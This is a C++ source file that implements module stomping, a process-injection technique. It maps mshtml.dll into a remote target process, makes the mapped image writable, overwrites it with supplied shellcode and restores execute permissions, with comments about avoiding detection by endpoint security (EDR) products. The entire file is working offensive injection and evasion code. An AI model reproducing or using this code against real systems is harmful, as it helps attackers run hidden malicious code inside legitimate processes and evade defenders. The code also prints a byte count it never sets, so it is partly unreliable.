#include "overloading.hpp"
#include <iomanip> // for std::hex

PVOID GetStompedAddress(HANDLE targetProcess, char* shellcode, size_t shellcodeSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    auto fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    //auto fNtCreateSectionStruct = syscallHandler.getSyscallDataByHash(L"ntdll.dll", 3492683984);
    auto fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    // 1. Create the Section from the DLL
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\mshtml.dll", GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return nullptr;

    HANDLE hSection = NULL;
    NTSTATUS status = fNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (status != 0) return nullptr;

    // 2. Map into Remote Process
    PVOID remoteBase = NULL;
    SIZE_T remoteViewSize = 0;

    // Map as Read/Execute initially
    status = fNtMapViewOfSection(hSection, targetProcess, &remoteBase, 0, 0, NULL, &remoteViewSize, 2, 0, PAGE_EXECUTE_READ);

    if (status != 0 && status != (NTSTATUS)0x40000003) {
        std::cerr << "[-] Mapping failed: 0x" << std::hex << status << "\n";
        CloseHandle(hSection);
        return nullptr;
    }

    std::cout << "[+] DLL mapped at: 0x" << remoteBase << "\n";

    // 3. FORCE permissions change (Fixes Error 998)
    DWORD oldProtect;
    if (mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_READWRITE, remoteViewSize)) {
        std::cerr << "[-] VirtualProtectEx failed: " << GetLastError() << "\n";
        return nullptr;
    }

    // 2. Clear the memory first (Optional but helps with stability)
    // Some EDRs look for 'residue' from the original DLL
    // memset(buffer, 0, shellcodeSize); 

    // 3. Write the bytes
    SIZE_T bytesWritten = 0;
    // We use the exact shellcodeSize here
    if (mainInjector.wrMem(targetProcess, remoteBase, shellcode, shellcodeSize)) {
        DWORD err = GetLastError();
        if (err == 299) {
            std::cerr << "[-] Partial write (299). Shellcode size (" << shellcodeSize
                << ") might exceed the RW protection range.\n";
        }
        else {
            std::cerr << "[-] WriteProcessMemory failed: " << err << "\n";
        }
        mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_EXECUTE_READ, remoteViewSize);
        return nullptr;
    }

    // 4. Restore protection to original
    mainInjector.protectMemFlag(targetProcess, remoteBase, PAGE_EXECUTE_READ, remoteViewSize);

    std::cout << "[+] Successfully stomped " << bytesWritten << " bytes at base.\n";
    return remoteBase;
}